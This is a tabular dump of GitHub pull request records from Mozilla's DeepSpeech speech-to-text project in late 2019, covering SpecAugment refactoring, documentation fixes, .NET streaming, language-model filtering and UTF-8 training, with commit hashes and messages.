`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,271a58e464541313611f3b61155a134c759f9e91,prepare files for refactoring
1652,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368f0d413a86a7131e06fe826c1334f9251655ad,sparse image warp to dynamic tensor
1653,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,450483c30bdc50dda3a41114724d60fba4b638a8,clean code
1654,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b3e4aa9d3459e7c2a0a6a9248fc4c17d2b081bd,don't touch original lint
1655,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec0ee65eb0dcf27d471dd3d806ed1ec7909b9e0b,[FIX] prevent random_uniform generate from x to x
1656,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fbc7e8596796b46fcbae3be34d7655cd99a908c,"[FIX] use time_warping_para to constraint control width, add logic to disable cache [ADD] num_control_points"
1657,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,533d15645f8b7bd830047dce3a493e0a7e04614b,[FIX] constraint time_warping_para to protect short audio augment
1658,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72c09ebb38dac039bc3b7a695fe60d4321297f91,[FIX] reversible error if dest_time == 0
1659,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3aedcc422222e6f6ecc0742458ac5f8f1707aedb,"[FIX] decprecate fixed-frequency-edge, which always have chance to raise tensor invertible error"
1660,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa41809a4019bca18ca157ff3c82863a3a8217f7,[MOD] change time_warping_para as 20 to make spec not sound too vague [FIX] make sure invertible error is not raised after many many epochs
1661,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c570cb670ae6f3c262ed325a6d4c1a9125bfed47,"sparse_warp still can have chance to raise error even after millions steps, so just recover the invertible error while training, unless error raise 3 times, it will be aborted"
1662,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
`python -u DeepSpeech.py --noshow_progressbar  --train_files data/ldc93s1/ldc93s1.csv --test_files data/ldc93s1/ldc93s1.csv --train_batch_size 1 --test_batch_size 1 --n_hidden 100 --epochs 200 --checkpoint_dir ""$checkpoint_dir"" --augmentation_sparse_warp true ""$@""`

And maybe we could add a wrapper in `feeding.py` or somewhere for exporting few spectrogram figures while training on augmentation, which should let us be more confident on augmenting data.
So far, I was only developing on jupyter notebook, but I couldn't review the augmented data while training.",mychiux413,13641193,2019-12-03T09:22:11Z,CONTRIBUTOR,True,304,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4133e620bd9c47e1d77595a80bdfb650870471d3,"remove debugging leftover, add UNSUPPORTED note, just skip invertible error"
1663,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2559,2559,Warn about master docs applying to master only,"This will need to be changed/removed when we do a stable release, and then added again, which is a pain, but given the amount of confusion we've seen due to master docs diverging from stable, I think it's worth it. We could also wait until after 0.6.0 to merge this so we don't have to do this dance so soon.",reuben,477142,2019-12-02T16:46:10Z,MEMBER,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34d4fb7b96313794bb23c0effe6d52fcf9efb8f0,"Warn about master docs applying to master only

X-DeepSpeech: NOBUILD"
1664,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2558,2558,Updated old docs in prep for 0.6.0,,kdavis-mozilla,12054740,2019-12-02T10:15:07Z,CONTRIBUTOR,True,36,55,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d96540d669da9eca0706524ee2a1114d8850713,Updating Introduction
1665,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2558,2558,Updated old docs in prep for 0.6.0,,kdavis-mozilla,12054740,2019-12-02T10:15:07Z,CONTRIBUTOR,True,36,55,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f75b9cc926b235b41bd79cbf1c0499f4bdb0a002,Updating Geometry
1666,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2558,2558,Updated old docs in prep for 0.6.0,,kdavis-mozilla,12054740,2019-12-02T10:15:07Z,CONTRIBUTOR,True,36,55,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d7dc179e98fc5287134ac55412c650a514bc9a9,Addressed review comments
1667,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2555,2555,Remove ubuntu-advantage-tools package to workaround ESM repository 401 problem,,reuben,477142,2019-11-28T15:28:17Z,MEMBER,True,2,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4b6431e2f66f907814a45bff99e204ca982a10c,Remove ubuntu-advantage-tools package to workaround ESM repository availability
1668,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2554,2554,Disable caching features to memory,"This causes weird behavior on our cluster, uses a lot of memory, and is much slower than caching to disk.",reuben,477142,2019-11-28T12:53:03Z,MEMBER,True,4,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3b1b5fd42a843bff7308c39b1c7122b915ec198,Disable caching features to memory
1669,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2553,2553,Link to proper README for examples/,Fixes #2552,lissyx,1645737,2019-11-27T12:43:27Z,COLLABORATOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1c038bbdfa4b72ede9ec04c3aacdc41e555c60a,"Link to proper README for examples/

Fixes #2552"
1670,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2551,2551,updated readme with correct transcribing command,"Transcribing command for non-gpu case when run directly gives an error: ""**deepspeech: error: the following arguments are required: --alphabet**"". Updated it with the correct command:

<img width=""1440"" alt=""error"" src=""https://user-images.githubusercontent.com/10601664/69664790-12dcc180-10af-11ea-8c87-f581e45dc1a8.png"">
",srijan14,10601664,2019-11-26T19:16:21Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,427c52ac0904c19f5269e94885da843bf4b0ce27,"updated readme with correct transcribing command

Transcribing command for non-gpu case when directly gives an error: ""deepspeech: error: the following arguments are required: --alphabet"". Updated it with the correct command."
1671,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2548,2548,Multi-stream support .NET,"Most of the test passing but I still need to test this with a prod model. The streaming test sometimes returns weird words at the beginning and at the end, I guess it is the extra data that the dummy model fails to recognize as silence.

At the moment I can't train a prod model to test and discard the silence issue.",carlfm01,32177100,2019-11-25T11:23:01Z,COLLABORATOR,True,138,103,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c6a95db39ea7d249e5d02f59a469ecb637829e5,"Remove unused members

FreeString and FreeMetadata are both private usage only."
1672,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2548,2548,Multi-stream support .NET,"Most of the test passing but I still need to test this with a prod model. The streaming test sometimes returns weird words at the beginning and at the end, I guess it is the extra data that the dummy model fails to recognize as silence.

At the moment I can't train a prod model to test and discard the silence issue.",carlfm01,32177100,2019-11-25T11:23:01Z,COLLABORATOR,True,138,103,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d024c333bcebe309af489db3207ea24a0d9890df,"Multi-stream support .NET

Adds multi-stream support for the .NET client using the same acoustic model."
1673,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2546,2546,Fixed store_true in --json,"Fixed `store_true` in `--json` in client,py. Issue #2545 
",aayagar001,46563478,2019-11-24T15:04:26Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2057305df76b4bad21d938a05f05c3ad4d45130c,Fixed store_true in --json
1674,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2544,2544,Support ElectronJS v7.1.2,Fixes #2543,lissyx,1645737,2019-11-24T13:27:09Z,COLLABORATOR,True,41,1,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dde09757d4858fc4c141024dd74cea75465afab0,"Support ElectronJS v7.1.2

Fixes #2543"
1675,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2541,2541,Fix: Added executable flag to DeepSpeech.py again,,tilmankamp,5991088,2019-11-21T12:12:00Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a160dc72c4544f614851bcb80dbec06656f3308c,Fix: Added executable flag to DeepSpeech.py again
1676,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2538,2538,Tool for bulk transcription,,tilmankamp,5991088,2019-11-14T17:25:02Z,CONTRIBUTOR,True,337,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c24c510fd90480e6a85e3cf5a2a7b07c0db4b901,Tool for bulk transcription
1677,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2538,2538,Tool for bulk transcription,,tilmankamp,5991088,2019-11-14T17:25:02Z,CONTRIBUTOR,True,337,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29528ed7b75df188f0326c81603d9fdc4b0d5b42,Separate process per file; less log noise
1678,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2535,2535,Do not fail cleanup if some cache dir is missing on macOS,,lissyx,1645737,2019-11-14T14:53:57Z,COLLABORATOR,True,7,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c04dd6798b3b16c32aca8dac27c7c2408346a730,Do not fail cleanup if some cache dir is missing on macOS
1679,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2534,2534,Doc line refs,,lissyx,1645737,2019-11-14T10:15:14Z,COLLABORATOR,True,8,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20c4ced80b85e31cd8634f342649892f326bb0b5,Update C example line numbers
1680,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2534,2534,Doc line refs,,lissyx,1645737,2019-11-14T10:15:14Z,COLLABORATOR,True,8,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,849ed712e102831952a37ac97319b3f0994a35d8,Update Java example line numbers
1681,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2534,2534,Doc line refs,,lissyx,1645737,2019-11-14T10:15:14Z,COLLABORATOR,True,8,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1d1ef6450a6f80c75b72af88d1099c5f4bb1721,Update JavaScript example line numbers
1682,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2534,2534,Doc line refs,,lissyx,1645737,2019-11-14T10:15:14Z,COLLABORATOR,True,8,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ad6c10e8c3a5cc4c77dbd7ee81e4f98250a3eed,Update Python example line numbers
1683,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2534,2534,Doc line refs,,lissyx,1645737,2019-11-14T10:15:14Z,COLLABORATOR,True,8,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a068f3face2d25a7d5036d17029fbb18faebb81,"Update example line numbers

Fixes #2533

X-DeepSpeech: NOBUILD"
1684,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2532,2532,Bump VERSION to 0.6.0-alpha.15,,lissyx,1645737,2019-11-14T08:19:10Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bf246dfab5ba9bbb247c286202ba24a68507f33,Bump VERSION to 0.6.0-alpha.15
1685,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2528,2528,Filter LM by removing very rare words,"This is a conservative change due to the lack of good validation sets to explore more significant changes with confidence (for now). Basically just filter words that happen one or two times in the dataset. The 500k number came from inspecting the counts, it's roughly half of the size of the original vocabulary (as can be seen by the 2x reduction in the trie file size). This does not significantly change the size of the LM itself. The main win should be to get rid of some of the rare stuff that's in the Librispeech vocab and can throw off the transcription.

@kdavis-mozilla we should validate this change with the models from your latest runs once they are done.",reuben,477142,2019-11-13T16:51:59Z,MEMBER,True,65,44,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad2769f479d0ddafc44e5a9053e4202bbf8e47b1,Filter LM by removing very rare words
1686,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2528,2528,Filter LM by removing very rare words,"This is a conservative change due to the lack of good validation sets to explore more significant changes with confidence (for now). Basically just filter words that happen one or two times in the dataset. The 500k number came from inspecting the counts, it's roughly half of the size of the original vocabulary (as can be seen by the 2x reduction in the trie file size). This does not significantly change the size of the LM itself. The main win should be to get rid of some of the rare stuff that's in the Librispeech vocab and can throw off the transcription.

@kdavis-mozilla we should validate this change with the models from your latest runs once they are done.",reuben,477142,2019-11-13T16:51:59Z,MEMBER,True,65,44,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,381faaf6b600c5e9704462cfd9544daa90a8977a,Switch to --prune 0 0 1 model and move generation code to a script
1687,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2527,2527,Don't fail on existing pyenv virtualenv symlink,,lissyx,1645737,2019-11-13T12:39:09Z,COLLABORATOR,True,12,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,024f8e4ddfeb706166c19345fa5dbefeb9b2f67d,Avoid force-reinstalling existing pyenv virtualenv
1688,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2525,2525,Move WPF example to MVVM,"Yes, I should have use MVVM from the beginning, here it is.  

This is just to make the WPF example testable. I'm finishing the tests and will introduce them within the next PR.


",carlfm01,32177100,2019-11-13T10:47:52Z,COLLABORATOR,True,558,315,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42e533016cdc2949bd37e3df5bff8d8f6828c185,Move WPF example to MVVM
1689,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2524,2524,Added support of --json timestamp in python client.py,Modified client.py to add function for converting metadata to timestamp of each word,aayagar001,46563478,2019-11-13T06:05:18Z,CONTRIBUTOR,True,46,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b74d9b1ce349a5500f3fad58fe8c259e55b2ed1,"client.py for supporting --json argument for timestamp info

Added function to convert metadata info into timestamp based json."
1690,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2524,2524,Added support of --json timestamp in python client.py,Modified client.py to add function for converting metadata to timestamp of each word,aayagar001,46563478,2019-11-13T06:05:18Z,CONTRIBUTOR,True,46,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c19ff7d3f18d8df97ca65b66e8ef13b3096da807,"Merge pull request #1 from aayagar001/json-timestamp

client.py for supporting --json argument for timestamp info"
1691,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2524,2524,Added support of --json timestamp in python client.py,Modified client.py to add function for converting metadata to timestamp of each word,aayagar001,46563478,2019-11-13T06:05:18Z,CONTRIBUTOR,True,46,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7530543286d50b83e685fe5f6fedf7a443744f70,Added --json timestamp support in python client
1692,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2524,2524,Added support of --json timestamp in python client.py,Modified client.py to add function for converting metadata to timestamp of each word,aayagar001,46563478,2019-11-13T06:05:18Z,CONTRIBUTOR,True,46,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c07e0a9208cbcfaef7652d3218bedaa0d2050c17,Fixed PEP8 standard
1693,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2523,2523,client.py for supporting --json argument for timestamp info,Added function and support to convert metadata info into timestamp based json for python client,aayagar001,46563478,2019-11-13T05:46:14Z,CONTRIBUTOR,False,46,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b74d9b1ce349a5500f3fad58fe8c259e55b2ed1,"client.py for supporting --json argument for timestamp info

Added function to convert metadata info into timestamp based json."
1694,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2522,2522,Support packaging as Zip file,,lissyx,1645737,2019-11-12T13:42:15Z,COLLABORATOR,True,45,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe6230020ce8f93530798deac33bf23a1362d8c4,Support packaging as Zip file
1695,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

